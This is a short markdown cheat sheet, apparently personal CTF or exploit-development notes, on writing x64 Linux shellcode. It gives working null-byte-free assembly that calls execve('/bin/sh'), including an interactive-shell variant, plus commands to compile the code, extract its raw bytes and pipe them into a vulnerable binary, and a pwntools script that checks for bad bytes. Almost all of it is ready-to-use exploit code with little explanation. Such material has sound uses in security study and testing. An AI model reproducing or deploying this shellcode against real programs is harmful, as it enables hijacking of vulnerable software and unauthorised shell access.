---
layout: wrapper
title: Writing Shellcode
---

### Compiling to ELF
```bash
gcc -nostdlib -static shellcode.s -o shellcode-elf
```

### Extracting raw bytes
```bash
objcopy --dump-section .text=shellcode-raw shellcode-elf
```

### Piping shellcode
```bash
(cat shellcode-raw : cat) | ./vuln
```

### shellcode.s `execve("/bin/sh", NULL, NULL)` for x64
```assembly
.global _start
_start:
.intel_syntax noprefix
    xor esi, esi
    push rsi
    mov rbx, 0x68732f6e69622f2f
    push rbx
    push rsp
    pop rdi
    push 0x3b
    pop rax
    cdq
    syscall
```

### Python debugging script
```python
#!/home/kali/.venv/bin/python

import sys
from pwn import *

class Colors:
    SUCCESS = '\033[92m'
    WARN = '\033[31m'
    RESET = '\033[0m'

context.update(arch='amd64', os='linux')

##################################################

shellcode = asm("""
    xor edx, edx
    push rdx

    mov rax, 0x68732f6e69622f2f
    push rax
    push rsp
    pop rdi

    push 0x0101712c
    xor DWORD PTR [rsp], 0x01010101
    push rsp
    pop rsi

    push rdx
    push rsi
    push rdi

    push rsp
    pop rsi

    push 0x3b
    pop rax

    syscall
""")

##################################################

print(f"len: {len(shellcode)}")

instructions = disasm(shellcode).split('\n')

BAD_BYTES = ['00']

for line in instructions:
    if any(bad_bytes in line for bad_bytes in BAD_BYTES):
        print(f"{Colors.WARN}{line}{Colors.RESET}")
    else:
        print(line)

##################################################

if "elf" in sys.argv:
    elf = make_elf(shellcode)
    with open("shellcode", "wb") as f:
        f.write(elf)
    print(f"{Colors.SUCCESS}elf written")
```
